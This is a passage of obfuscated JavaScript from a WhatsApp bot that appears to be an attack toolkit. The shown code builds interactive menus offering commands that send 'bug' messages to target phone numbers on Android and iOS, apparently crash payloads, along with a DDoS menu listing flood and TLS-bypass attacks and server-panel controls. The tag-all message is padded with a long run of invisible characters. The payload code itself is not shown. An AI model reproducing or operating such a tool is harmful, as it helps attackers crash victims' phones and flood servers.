                      'buttonParamsJson': JSON.stringify(_0x268fc2)
                    }, {
                      'name': 'cta_url',
                      'buttonParamsJson': "{\"display_text\":\"My Creator\",\"url\":\"https://youtube.com/@abyyyferrr\",\"merchant_url\":\"https://youtube.com/@abyyyferrr\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x257ec2.sender,
            'quoted': _0x257ec2
          });
          await _0x488b14.relayMessage(_0x90717c.key.remoteJid, _0x90717c.message, {
            'messageId': _0x90717c.key.id
          });
        }
        break;
      case "bugmenu":
        {
          await _0x42918c();
          const _0x6521ab = "❲ `𝗔𝗯𝘆𝘆 𝗫𝘃𝗡` ❳\n⮕ Hello " + _0x2b0ab7 + "\n⮕ *i am a bot created by Abyy*\n⮕ CREATOR : 𝗔𝗯𝘆𝘆 𝗫𝘃𝗡\n⮕ OWNER : " + global.owner + "​​​​​​​​​​​​​​​​\n\n⌜ ANDROID ⌟\n​​​​​​​​​​​​​​​​​​​​​​​​​​\n➼ .xvnhigh *62xxx*\n➼ .abyybugs *62xxx*\n➼ .minerx *62xxx*\n➼ .trashloc *62xxx*\n➼ .bigershard *62xxx*\n\n⌜ IOS ⌟\n\n➼ .ipkentang *62xxx*\n➼ .trashios *62xxx*\n➼ .iosampas *62xxx*\n➼ .iphone *62xxx*\n\n⌜ BUG DI TEMPAT ⌟\n\n➼ .openvcs?\n➼ .assalamualaikum\n➼ .paket?\n➼ .halo_bg\n➼ .kenal_abyy?\n➼ .lawak_suki\n➼ .lawak_ngerip\n➼ .riper?\n";
          let _0x5dca83 = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': ".ddosmenu"
            }]
          }];
          let _0x241cc0 = {
            'title': "𝗔𝗯𝘆𝘆 𝗫𝘃𝗡͖",
            'sections': _0x5dca83
          };
          let _0x4b4d02 = generateWAMessageFromContent(_0x257ec2.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x257ec2.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x6521ab
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync('./image/byzx.jpg')
                    }, {
                      'upload': _0x488b14.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': 'single_select',
                      'buttonParamsJson': JSON.stringify(_0x241cc0)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Whatsapp Channel\",\"url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x257ec2.sender,
            'quoted': _0x257ec2
          });
          await _0x488b14.relayMessage(_0x4b4d02.key.remoteJid, _0x4b4d02.message, {
            'messageId': _0x4b4d02.key.id
          });
        }
        break;
      case "allmenu":
        {
          await _0x42918c();
          const _0x53b5bc = "❲ `𝗔𝗯𝘆𝘆 𝗫𝘃𝗡` ❳\n⮕ Hello " + _0x2b0ab7 + "\n⮕ 私は作られたボットです\n⮕ CREATOR : 𝗔𝗯𝘆𝘆 𝗫𝘃𝗡\n⮕ OWNER : " + global.owner + "\n\n\n   ⌜ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ⌟\n\n➼ ᴀᴅᴅᴏᴡɴᴇʀ\n➼ ᴀᴅᴅᴘʀᴇᴍ\n➼ ᴅᴇʟᴏᴡɴᴇʀ\n➼ ᴅᴇʟᴘʀᴇᴍ\n➼ ᴘᴜʙʟɪᴄ\n➼ sᴇʟғ\n\n\n   ⌜ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ⌟\n\n➼ ᴇɴᴄ <ᴄᴏᴅᴇ>\n➼ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>\n➼ ᴀɪ <ᴛᴇᴋs>\n\n   ⌜ 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 ⌟\n\n➼ ʜᴅᴠɪᴅᴇᴏ <ʀᴇᴘʟʏ ɪᴍᴀɢᴇ>\n➼ ꜱᴛɪᴄᴋᴇʀ <ʀᴇᴘʟʏ ɪᴍᴀɢᴇ>\n➼ ᴘʟᴀʏ <ɴᴀᴍᴀ ʟᴀɢᴜ>\n\n   ⌜ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔 ⌟\n   \n➼ ᴛɪᴋᴛᴏᴋꜱʟɪᴅᴇ <ʟɪɴᴋ>\n➼ ᴛɪᴋᴛᴏᴋ <ʟɪɴᴋ>\n➼ ᴛᴛᴍᴘ3 <ʟɪɴᴋ>\n➼ ᴛᴛᴍᴘ4 <ʟɪɴᴋ>\n\n   ⌜ DDOS MENU ⌟\n   \n➼  ᴅᴅᴏs\n➼  ᴍɪx\n➼  ғʟᴏᴀᴅs\n➼  ᴜᴀ\n➼  xᴄʜʀᴏᴍᴇ\n➼  ᴛʟs\n➼  ᴛʟsʙʏᴘᴀss\n➼  ᴛʟsᴠ2\n➼  ᴛʟs-ᴠɪᴘ\n➼  xc\n\n   ⌜ 𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 ⌟\n ➼ ᴀᴅᴅɢᴄ\n ➼ ʟɪsᴛᴜsʀ\n ➼ ʟɪsᴛᴀᴅᴍ\n ➼ ᴅᴇʟᴜsʀ\n ➼ ᴅᴇʟᴀᴅᴍ\n ➼ listsrv\n ➼ delsrv\n ➼ toadmin\n ➼ 1ɢʙ\n ➼ 2ɢʙ\n ➼ 3ɢʙ\n ➼ 4ɢʙ\n ➼ 5ɢʙ\n ➼ 6ɢʙ\n ➼ 7ɢʙ\n ➼ 8ɢʙ\n ➼ 9ɢʙ\n ➼ 10ɢʙ\n ➼ ᴜɴʟɪ\n\n  ⌜ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 ⌟\n➼ ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>\n➼ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>\n➼ ᴋɪᴄᴋ <ᴛᴀɢ>\n➼ ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>\n➼ ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>\n";
          let _0x41f137 = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': '.allmenu'
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': ".bugmenu"
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': '.ddosmenu'
            }]
          }];
          let _0x481a6e = {
            'title': "𝗔𝗯𝘆𝘆 𝗫𝘃𝗡͖",
            'sections': _0x41f137
          };
          let _0x2fb33b = generateWAMessageFromContent(_0x257ec2.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x257ec2.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x53b5bc
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync("./image/byzx.jpg")
                    }, {
                      'upload': _0x488b14.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify(_0x481a6e)
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Whatsapp Channel\",\"url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x257ec2.sender,
            'quoted': _0x257ec2
          });
          await _0x488b14.relayMessage(_0x2fb33b.key.remoteJid, _0x2fb33b.message, {
            'messageId': _0x2fb33b.key.id
          });
        }
        break;
      case "buttonbug":
        {
          await _0x42918c();
          const _0x184c38 = "❲ `𝗔𝗯𝘆𝘆 𝗫𝘃𝗡` ❳\n⮕ Hello " + _0x2b0ab7 + "\n⮕ *i am a bot created by Abyy*\n⮕ CREATOR : 𝗔𝗯𝘆𝘆 𝗫𝘃𝗡\n⮕ OWNER : " + global.owner + "\n\n☠️⃟ᝤ𝐗͢𝐕͖𝐍ͧ Э͜𝐗͢𝐂𝐋͋𝐔͖𝐒͢їѴͦ𝐄͆͡ຯ͜͡🩸͜\n\n➼ 𝗫𝘁𝘅𝘇 𝟲𝟮𝘅𝘅𝘅\n\n𝙽𝙾𝚃𝙴 : 𝚒𝚗𝚒 𝚊𝚍𝚊𝚕𝚊𝚑 𝚋𝚞𝚐 𝚋𝚞𝚝𝚝𝚘𝚗 𝚢𝚊𝚗𝚐 𝚓𝚒𝚔𝚊 𝚔𝚊𝚕𝚒𝚊𝚗 𝚔𝚎𝚝𝚒𝚔 𝐱𝐛𝐮𝐭𝐭𝐨𝐧 𝟔𝟐𝐱𝐱𝐱. 𝚖𝚊𝚔𝚊 𝚗𝚊𝚗𝚝𝚒 𝚔𝚊𝚕𝚒𝚊𝚗 𝚊𝚔𝚊𝚗 𝚍𝚒 𝚜𝚞𝚛𝚞𝚑 𝚖𝚎𝚖𝚒𝚕𝚒𝚑 𝚙𝚎𝚗𝚢𝚎𝚛𝚊𝚗𝚐𝚊𝚗 𝚋𝚞𝚐\n──────────────❐";
          let _0x3ea137 = [{
            'title': "⿻  ⌜ LIST MENU ⌟  ⿻",
            'highlight_label': "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': 'Ւ',
              'id': ".allmenu"
            }]
          }, {
            'title': "𝗗𝗔𝗡𝗚𝗘𝗥𝗢𝗨𝗦 ⚠️☣️",
            'highlight_label': "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
            'rows': [{
              'title': '⺢',
              'id': '.bugmenu'
            }]
          }, {
            'highlight_label': "𝖝 𝖇𝖚𝖙𝖙𝖔𝖓",
            'rows': [{
              'title': '☇',
              'id': ".buttonbug"
            }]
          }, {
            'highlight_label': "𝐝𝐝𝐨𝐬 ⚠️",
            'rows': [{
              'title': '☭',
              'id': ".ddosmenu"
            }]
          }];
          let _0x2629b3 = {
            'title': "𝗔𝗯𝘆𝘆 𝗫𝘃𝗡͖",
            'sections': _0x3ea137
          };
          let _0x4c7ab0 = generateWAMessageFromContent(_0x257ec2.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x257ec2.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x184c38
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': "⿻  ⌜ 𝐏𝐮𝐤𝐢𝐦𝐚𝐤 ⌟  ⿻"
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': await fs.readFileSync('./image/byzx.jpg')
                    }, {
                      'upload': _0x488b14.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': 'single_select',
                      'buttonParamsJson': JSON.stringify(_0x2629b3)
                    }, {
                      'name': 'cta_url',
                      'buttonParamsJson': "{\"display_text\":\"Whatsapp Channel\",\"url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaf83Dc0gcfHXTYTU51L\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x257ec2.sender,
            'quoted': _0x257ec2
          });
          await _0x488b14.relayMessage(_0x4c7ab0.key.remoteJid, _0x4c7ab0.message, {
            'messageId': _0x4c7ab0.key.id
          });
        }
        break;
      case 'z':
      case 'hidetag':
        if (!_0x14f0d6) {
          return _0x2d94c9(mess.only.owner);
        }
        if (!_0x5592c0) {
          return _0x2d94c9("Teks?");
        }
        _0x488b14.sendMessage(_0x257ec2.chat, {
          'text': _0x5592c0 ? _0x5592c0 : '',
          'mentions': _0x1c2263.map(_0x432d47 => _0x432d47.id)
        }, {
          'quoted': _0x257ec2
        });
        break;
      case "tagall":
        {
          if (!_0x14f0d6 && !_0x341a7a) {
            return _0x2d94c9(mess.admin);
          }
          if (!_0x157b9) {
            return joreply(mess.only.group);
          }
          if (!q) {
            return _0x2d94c9("Teks Nya Mana Kak?");
          }
          let _0x3edfd0 = (q ? q : '') + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎